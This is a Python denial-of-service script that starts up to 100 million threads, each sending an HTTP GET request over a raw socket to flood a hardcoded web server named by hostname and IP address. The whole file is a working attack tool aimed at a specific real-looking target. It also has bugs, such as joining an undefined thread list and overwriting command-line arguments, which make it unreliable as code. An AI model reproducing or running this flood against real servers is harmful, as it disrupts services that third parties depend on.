import socket
import string
import sys
import threading
import time


# Print thread status
def print_status():
    global thread_num
    thread_num += 1
    if thread_num % 100 == 0:
        print("cont: " + str(thread_num))

# Perform the request
def dos_attack():
    print_status()
    url_path = str(string.ascii_letters + string.digits + string.punctuation)
    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))
        # Send the request according to HTTP spec
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode()
        dos.send(byt)
    except socket.error:
        dos.close()
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

if __name__ == '__main__':
    host = "http://apache1.willilazarov.cz/"
    ip = "109.238.43.202"
    port = 80
    num_requests = 100000000
    sys.argv = [host, ip, port, num_requests]

    # Convert FQDN to IP
    try:
        host = str(sys.argv[1]).replace("https://", "").replace("http://", "")
        print(host)
        ip = socket.gethostbyname(host)
        print(ip)
    except socket.gaierror:
        print("Wrong website")
        sys.exit(2)

    # Create a shared variable for thread counts
    thread_num = 0
    thread_num_mutex = threading.Lock()

    print("Attack started")

    # Spawn a thread per request
    thread_list = []
    for i in range(num_requests):
        new_thread = threading.Thread(target=dos_attack)
        new_thread.start()
        thread_list.append(new_thread)
        # Adjusting this sleep time will affect requests per second
        time.sleep(0.00001)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads